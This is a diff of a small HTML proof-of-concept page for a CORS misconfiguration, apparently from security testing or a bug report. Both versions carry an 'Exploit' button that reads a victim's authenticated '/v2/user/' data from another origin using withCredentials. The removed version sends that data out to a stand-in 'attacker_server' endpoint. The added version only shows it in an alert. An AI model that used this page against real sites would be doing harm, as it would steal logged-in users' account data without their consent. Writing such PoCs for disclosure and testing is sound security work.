@@ -1,28 +1,23 @@
 <html>
-    <body>
-        <h2>CORS PoC</h2>
-        <div id="demo">
-            <button type="button" onclick="cors()">Exploit</button>
-        </div>
-        <script>
-            function cors() {
-            var xhr = new XMLHttpRequest();
-            xhr.onreadystatechange = function() {
-                if (this.readyState == 4 && this.status == 200) {
-                    appendToFile(this.responseText);
-                }
-            };
-            xhr.open("GET", "https://vulenrable_host/v2/user/", true);
-            xhr.withCredentials = true;
-            xhr.send();
-            }
-
-            function appendToFile(content) {
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "http://attacker_server/saveData", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("content=" + encodeURIComponent(content)); 
-            }
-        </script>
-    </body>
-</html>
+     <body>
+         <h2>CORS POC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.responseType = "blob";
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.response);
+                 }
+             };
+              xhr.open("GET",
+                       "https://vulenrable_host/v2/user/", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
